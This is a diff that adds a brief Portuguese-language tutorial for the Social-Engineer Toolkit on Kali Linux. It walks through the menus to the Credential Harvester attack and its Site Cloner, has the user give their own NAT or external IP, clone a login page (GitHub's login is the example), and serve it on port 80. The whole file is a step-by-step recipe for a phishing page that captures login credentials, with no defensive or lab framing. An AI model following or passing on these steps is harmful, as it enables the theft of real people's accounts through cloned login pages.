@@ -1,0 +1,71 @@
+S.O utilizado: Kali Linux
+
+-- Ativação Setoolkit
+
+-> sudo setoolkit
+
+ Select from the menu:
+
+   1) Social-Engineering Attacks
+   2) Penetration Testing (Fast-Track)
+   3) Third Party Modules
+   4) Update the Social-Engineer Toolkit
+   5) Update SET configuration
+   6) Help, Credits, and About
+
+  99) Exit the Social-Engineer Toolkit
+
+-- Selecione Opção 1
+
+ Select from the menu:
+
+   1) Spear-Phishing Attack Vectors
+   2) Website Attack Vectors
+   3) Infectious Media Generator
+   4) Create a Payload and Listener
+   5) Mass Mailer Attack
+   6) Arduino-Based Attack Vector
+   7) Wireless Access Point Attack Vector
+   8) QRCode Generator Attack Vector
+   9) Powershell Attack Vectors
+  10) Third Party Modules
+
+  99) Return back to the main menu.
+
+-- Selecione 2
+
+
+   1) Java Applet Attack Method
+   2) Metasploit Browser Exploit Method
+   3) Credential Harvester Attack Method
+   4) Tabnabbing Attack Method
+   5) Web Jacking Attack Method
+   6) Multi-Attack Web Method
+   7) HTA Attack Method
+
+  99) Return to Main Menu
+
+-- Selecione 3
+
+  
+   1) Web Templates
+   2) Site Cloner
+   3) Custom Import
+
+  99) Return to Webattack Menu
+
+-- Selecione opção 2
+
+
+IP address for the POST back in Harvester/Tabnabbing [192.168.x.x]:
+-- Informe seu IP NAT ou informe seu IP externo, caso não saiba informar seu IP NAT, use o comando IFCONFIG.
+
+Enter the url to clone: 
+
+-- Informe o site/login que você deseja clonar da web. No exemplo, utilizei: https//github.com/login
+
+-- No seu navegador web digite: [seu IP]:80
+eg: 192.168.0.108:80
+
+
+
